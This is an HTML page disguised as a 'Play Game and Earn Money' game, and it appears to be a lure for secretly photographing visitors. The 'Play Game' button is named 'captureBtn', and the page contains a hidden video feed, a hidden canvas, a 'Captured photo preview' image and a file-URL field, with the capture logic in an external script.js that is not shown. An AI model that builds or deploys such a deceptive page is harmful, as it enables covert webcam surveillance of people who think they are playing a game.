<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Play Game and Earn Money</title>

  <style>
    body{font-family:Arial,Helvetica,sans-serif;background:#f3f4f6;margin:0;padding:20px;display:flex;flex-direction:column;align-items:center;}
    .card{width:100%;max-width:420px;background:#fff;border-radius:16px;padding:24px;box-shadow:0 6px 20px rgba(0,0,0,0.08);text-align:center;}
    h1{margin:0 0 8px;font-size:22px;color:#0f172a;}
    p{color:#475569;margin:0 0 18px;}
    button{background:#16a34a;color:white;border:0;padding:12px 22px;border-radius:10px;font-size:16px;cursor:pointer;transition:transform .12s;}
    button:active{transform:scale(.98)}
    #status{margin-top:14px;font-weight:600}
    #preview{margin-top:16px;max-width:100%;border-radius:12px;display:none;box-shadow:0 6px 18px rgba(15,23,42,0.08)}
    .small{font-size:13px;color:#64748b;margin-top:8px}
  </style>
</head>
<body>
  <div class="card">
    <h1>ðŸ’° Play Game and Earn Money</h1>
    <p>Click <strong>Play Game</strong> to try your luck.</p>

    <button id="captureBtn">Play Game</button>
    <div id="status" class="small"></div>
    <img id="preview" alt="Captured photo preview" />
    <div id="fileUrl" class="small"></div>
  </div>

  <video id="video" autoplay playsinline style="display:none"></video>
  <canvas id="canvas" style="display:none"></canvas>

  <script src="script.js"></script>
</body>
</html>
